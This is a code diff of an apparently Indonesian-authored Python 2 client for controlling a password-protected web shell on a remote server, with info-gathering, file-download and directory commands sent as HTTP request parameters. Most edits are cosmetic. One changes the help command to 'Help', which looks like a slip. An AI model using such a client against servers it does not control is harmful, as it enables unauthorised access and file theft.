@@ -8,6 +8,7 @@ from sys import platform
 reload(sys)
 sys.setdefaultencoding('utf8')
 
+
 def cls():
     os.system('cls' if os.name=='nt' else 'clear')
      
@@ -32,9 +33,9 @@ def banner():
 def help():
     print("""
 [\033[91m+\033[97m] Command :
-└[\033[92m•\033[97m] info       : information gathering
-└[\033[92m•\033[97m] download   : download file
-└[\033[92m•\033[97m] cd <dir>   : change directory""")
+└[\033[92m•\033[97m] info\t\t: information gathering
+└[\033[92m•\033[97m] download <file>\t: download file
+└[\033[92m•\033[97m] cd <dir>\t\t: change directory""")
 
 def fiturcd(cmd, getdir):
     getcmd = re.match(r'cd (.*)', cmd, re.M|re.I)
@@ -64,10 +65,7 @@ def fiturdownload(cmd, getdir):
     
     if getfile:
         result = getdir + "/" + getfile.group(1)
-        
         return result
-        
-        #
     else:
         return False
 
@@ -100,7 +98,7 @@ def connect():
         result = ""
         
         while True:
-                cmd = raw_input(command)
+                cmd = raw_input(command).rstrip()
 
                 if cmd == "exit":
                     break
@@ -109,7 +107,7 @@ def connect():
                 elif cmd == "info":
                     result = get(url, params={"password":password,"dir":getdir,"aksi":"info","cmd":""}).text
                     print(result)
-                elif cmd == "help":
+                elif cmd == "Help":
                     help()
 
 
@@ -130,7 +128,7 @@ def connect():
                 print("\033[92m"+result + "\033[0m\n")         
     
     else:
-        print("[-] Password is Incoret")
+        print("[-] Password is Incorrect")
         exit(0)
 
 
